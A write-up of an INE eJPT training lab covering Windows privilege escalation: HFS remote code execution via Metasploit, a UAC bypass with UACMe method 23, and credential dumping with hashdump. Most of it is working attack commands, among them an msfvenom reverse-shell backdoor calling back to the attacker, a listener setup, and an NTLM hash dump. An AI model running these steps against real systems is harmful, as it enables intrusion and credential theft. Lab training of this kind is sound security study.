# Windows UAC Bypass (UACMe) - INE eJPT

INE privilege escalation lab demonstrating the distinction between an admin account and a high-integrity process on Windows. Initial access via HFS RCE lands as an admin user but `getsystem` fails because UAC prevents elevation. UACMe (`Akagi64.exe`) bypasses UAC using a DLL hijack technique, delivering a high-integrity Meterpreter session that can then dump NTLM hashes from LSASS.

Target: `demo.ine.local`

---

## Initial Access - HFS RCE

```bash
nmap demo.ine.local
nmap -sV -p 80 demo.ine.local
searchsploit hfs
```

Port 80 - Rejetto HFS 2.3.

```bash
msfconsole -q
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS demo.ine.local
exploit
getuid
sysinfo
```

Session context: admin user, but standard integrity - UAC is active.

---

## Privilege Escalation Attempt (Fails)

```bash
getsystem
```

Fails. Being in the Administrators group does not grant elevated token privileges when UAC is enabled and the process was launched at standard integrity.

### Verify Group Membership

```bash
shell
net localgroup administrators
```

The current user is in `Administrators`. UAC is confirmed as the barrier.

---

## Process Migration

```bash
ps -S explorer.exe
migrate <PID>
```

Migration to `explorer.exe` is required for UAC bypass techniques that target the user desktop session context.

---

## UAC Bypass with UACMe

### Prepare the Payload

From the Kali attacker:

```bash
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=<attacker_ip> LPORT=4444 \
  -f exe > backdoor.exe
```

### Set Up Listener

```bash
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <attacker_ip>
set LPORT 4444
exploit -j
```

### Upload Files to Target

```bash
cd C:\Users\admin\AppData\Local\Temp
upload Akagi64.exe
upload backdoor.exe
```

### Execute UACMe

```bash
shell
Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.exe
```

Method 23 - DLL hijack via `pkgmgr.exe`. UACMe spawns the payload with high integrity, bypassing the UAC prompt entirely.

New Meterpreter session opens with elevated privileges.

---

## Post-Exploitation - Credential Dumping

```bash
ps -S lsass.exe
migrate <PID>
hashdump
```

Administrator NTLM hash (flag):

```
4d6583ed4cef81c2f2ac3c88fc5f3da6
```

---

## Key Takeaways

- Being in the `Administrators` group and running a high-integrity process are not the same thing. UAC creates a split token: standard integrity for normal operations, elevated token only when explicitly elevated.
- `getsystem` fails when UAC is active because none of its techniques create a new high-integrity token from a standard-integrity process without user confirmation.
- UACMe contains 70+ UAC bypass methods. Method 23 abuses `pkgmgr.exe` via DLL hijacking - it loads the attacker's DLL in the context of a trusted elevated process without triggering a UAC prompt.
- Process migration to `explorer.exe` before running UACMe ensures the bypass targets the correct desktop session. Services and non-interactive processes run in a different session context.
- After UAC bypass, LSASS migration and `hashdump` require the elevated token - they fail or return incomplete results from a standard-integrity process.

---

## Disclaimer

This lab was completed in a controlled environment provided by INE as part of the eJPT preparation path. All actions were performed strictly for educational purposes.
